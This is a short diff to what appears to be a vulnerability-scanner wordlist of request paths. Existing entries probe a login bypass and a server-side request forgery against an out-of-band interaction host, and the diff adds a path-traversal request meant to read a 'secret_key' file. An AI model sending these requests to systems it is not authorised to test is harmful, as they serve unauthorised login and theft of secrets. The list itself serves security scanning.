@@ -269,3 +269,4 @@
 /index.php/api/modular-connector/login/{{string}}/?origin=mo&type=foo
 /api/modular-connector/login/{{string}}/?origin=mo&type=foo
 /wp-admin/admin-ajax.php?action=formcraft3_get&URL=https://{{interactsh-url}}
+/api/v1/files/profile_pictures/../secret_key
